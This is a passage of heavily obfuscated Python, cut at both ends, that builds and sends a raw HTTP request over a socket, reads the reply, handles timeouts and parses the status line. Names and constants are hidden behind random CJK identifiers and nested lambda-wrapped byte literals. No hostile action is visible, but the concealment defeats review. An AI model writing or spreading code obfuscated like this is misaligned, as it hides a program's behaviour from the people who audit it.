                        client.send((lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕format(method, (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [3333333333333333333333333333333333333333333333333333333333242422222222222222222722222265]))))())())(), path, (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕http_version, (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [3333333333333333333333333333333333333333333333333333333333242422222222222222222722222246, 3333333333333333333333333333333333333333333333333333333333242422222222222222222722222243, 3333333333333333333333333333333333333333333333333333333333242422222222222222222722222305, 3333333333333333333333333333333333333333333333333333333333242422222222222222222722222344, 3333333333333333333333333333333333333333333333333333333333242422222222222222222722222348, 3333333333333333333333333333333333333333333333333333333333242422222222222222222722222349, 3333333333333333333333333333333333333333333333333333333333242422222222222222222722222291]))))())())(), hostname, headers, (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [3333333333333333333333333333333333333333333333333333333333242422222222222222222722222246, 3333333333333333333333333333333333333333333333333333333333242422222222222222222722222243, 3333333333333333333333333333333333333333333333333333333333242422222222222222222722222246, 3333333333333333333333333333333333333333333333333333333333242422222222222222222722222243]))))())())()).encode())
                        while (lambda: (lambda 籾鞴衔蓞闹畞: 籾鞴衔蓞闹畞 + (lambda: 趄诖狗谦頠鮳((lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'))()))())((lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/'))()) == (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x01'))())():
                            data = client.recv((lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x10\x00'))())
                            response += data
                            if not data:
                                client.close()
                                break
                    except Exception as e:
                        if not response and (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x02'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x06'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfd'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xb9'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0e'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))()]))))())())() in str(e):
                            raise 襺糰蚩瘢倓槓((lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\n'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0e'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0c'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0c'))()]))))())())()).exceptions.ConnectTimeout((lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x14'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x16'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xb9'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xc1'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xb9'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x02'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x06'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0e'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xd6'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x14'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x16'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xc2'))()]))))())())().format(str(e), str(timeout)))
                        elif response and (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x02'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x06'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfd'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xb9'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0e'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))()]))))())())() in str(e):
                            pass
                        else:
                            襺糰蚩瘢倓槓((lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x05'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x00'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x00'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x02'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x00'))()]))))())())()).error((lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\n'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0e'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0c'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0c'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xd3'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xb9'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x14'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x16'))()]))))())())().format(str(e)))
                    except:
                        pass
                    if response:
                        return response
                    else:
                        return None
                response = req(hostname, port, path, http_version, method, timeout)
                try:
                    del req
                except:
                    pass
                if response == None:
                    return None
                try:
                    response = response.split(b'\r\n')
                    status_code = int(response[(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/'))()].split(b' ')[(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x01'))()].decode((lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x05'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfa'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x02'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xc6'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xca'))()]))))())())()))
                    reason = str(response[(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x01'))()].split(b' ')[(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x01'))()].decode((lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x05'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfa'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x02'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xc6'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xca'))()]))))())())()))
                    response = b'\r\n'.join(response[(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x01'))():])
                except IndexError:
                    襺糰蚩瘢倓槓((lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x05'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x00'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x00'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x02'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x00'))()]))))())())()).error((lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\n'))(), (lambda: 